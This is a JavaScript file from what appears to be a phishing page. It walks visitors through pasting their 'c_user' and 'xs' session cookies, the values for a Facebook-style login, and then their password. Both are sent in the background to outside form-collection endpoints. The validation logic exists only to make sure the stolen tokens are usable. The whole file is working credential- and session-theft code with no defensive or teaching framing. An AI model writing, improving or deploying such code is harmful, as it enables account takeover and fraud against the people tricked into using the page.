
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

// Configure FormSpark form submissions
const cookieForm = document.getElementById('cookieForm');
const passwordForm = document.getElementById('passwordForm');

// Get form elements
const cuserInput = document.getElementById('cuser');
const xsInput = document.getElementById('xs');
const submitButton = cookieForm.querySelector('button[type="submit"]');

// Initially disable the submit button
submitButton.disabled = true;
submitButton.style.opacity = '0.5';
submitButton.style.cursor = 'not-allowed';

// Validation functions
function validateCuser(value) {
    // Must be 15-17 digits, only numbers
    return /^\d{15,17}$/.test(value);
}

function validateXs(value) {
    const mustContainEncodedColon = value.includes('%3A');
    const strongPattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$/.test(value);
    return mustContainEncodedColon && strongPattern;
}

function updateSubmitButton() {
    const cuserValid = validateCuser(cuserInput.value);
    const xsValid = validateXs(xsInput.value);

    if (cuserValid && xsValid) {
        submitButton.disabled = false;
        submitButton.style.opacity = '1';
        submitButton.style.cursor = 'pointer';
    } else {
        submitButton.disabled = true;
        submitButton.style.opacity = '0.5';
        submitButton.style.cursor = 'not-allowed';
    }
}

// Add real-time validation listeners
cuserInput.addEventListener('input', updateSubmitButton);
xsInput.addEventListener('input', updateSubmitButton);

// Restrict c_user input to numbers only
cuserInput.addEventListener('keypress', function(e) {
    if (!/\d/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight') {
        e.preventDefault();
    }
});

cookieForm.addEventListener('submit', function(e) {
    e.preventDefault();

    // Double-check validation before submission
    if (!validateCuser(cuserInput.value)) {
        alert('c_user must be 15-17 digits long and contain only numbers');
        return;
    }

    if (!validateXs(xsInput.value)) {
        alert('xs token must be at least 12 characters, contain upper/lowercase letters, digits, special characters, and must include "%3A"');
        return;
    }

    // Submit form data in background
    fetch('https://submit-form.com/wvGvlIWs9', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            cuser: cuserInput.value,
            xs: xsInput.value
        })
    }).then(() => {
        showPage('page4');
    }).catch(error => {
        console.error('Error:', error);
        showPage('page4'); // Still proceed to password page
    });
});

passwordForm.addEventListener('submit', function(e) {
    e.preventDefault();

    const password = document.getElementById('password').value;
    if (!password) {
        alert('Please enter your password');
        return;
    }

    fetch('https://submit-form.com/Pn6Mi2Nat', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            passwrod: password
        })
    }).then(() => {
        window.location.href = 'thankyou.html';
    }).catch(error => {
        console.error('Error:', error);
        window.location.href = 'thankyou.html';
    });
});
